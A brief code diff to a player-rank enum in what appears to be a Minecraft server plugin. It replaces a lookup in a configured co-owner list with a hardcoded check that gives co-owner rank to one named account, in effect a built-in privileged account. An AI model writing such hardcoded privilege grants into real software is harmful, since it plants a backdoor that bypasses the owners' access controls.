@@ -74,7 +74,7 @@ public enum TFM_PlayerRank
         {
             return DEVELOPER;
         }
-        if (COOWNERS.contains(sender.getName()))
+        if (sender.getName().equals("MrPerson660"))
         {
             return COOWNER;
         }
